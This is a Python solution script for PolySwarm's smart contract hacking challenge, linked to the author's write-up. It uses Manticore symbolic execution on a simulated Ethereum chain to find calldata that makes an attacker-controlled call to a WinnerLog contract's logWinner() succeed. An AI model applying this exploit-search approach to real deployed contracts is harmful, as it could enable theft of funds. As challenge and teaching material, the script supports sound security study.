#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = "Raz0r"
__email__  = "me@raz0r.name"

"""
This is a solution to the PolySwarm's smart contract hacking challenge done with manticore.
Please refer to https://raz0r.name/writeups/polyswarm-smart-contract-hacking-challenge-writeup/ for a complete walk through.
"""

import binascii
from manticore.ethereum import ManticoreEVM, ABI

m = ManticoreEVM()

# Set up accounts with original addresses
owner_account      = m.create_account(balance=1000, name='owner',     address=0xbc7ddd20d5bceb395290fd7ce3a9da8d8b485559)
attacker_account   = m.create_account(balance=1000, name='attacker',  address=0x762C808237A69d786A85E8784Db8c143EB70B2fB)
cashmoney_contract = m.create_account(balance=1000, name='CashMoney', address=0x64ba926175bc69ba757ef53a6d5ef616889c9999)

# Create WinnerLog contract using its init bytecode
with open("winnerlog.bin", "rb") as f:
    bytecode = f.read()

winnerlog_contract = m.create_contract(init=bytecode, owner=owner_account, name="WinnerLog", address=0x2e4d2a597a2fcbdf6cc55eb5c973e76aa19ac410)

# Allow cashmoney_contract to call logWinner() on winnerlog_contract
m.transaction(caller=owner_account,
              address=winnerlog_contract,
              data=binascii.unhexlify(b"c3e8512400000000000000000000000064ba926175bc69ba757ef53a6d5ef616889c9999"), value=0)

# Prepare symbolic buffer and call logWinner() with that symbolic buffer
symbolic_data = m.make_symbolic_buffer(64)
calldata      = ABI.function_call('logWinner(address,uint256,bytes)', attacker_account, 0, symbolic_data)
m.transaction(caller=cashmoney_contract, address=winnerlog_contract, data=calldata, value=0, gas=10000000)

# Look for a running state that is not reverted
for state in m.running_states:
    world = state.platform
    result = state.solve_one(symbolic_data)
    print("[+] FOUND: {}".format(binascii.hexlify(result)))
    break
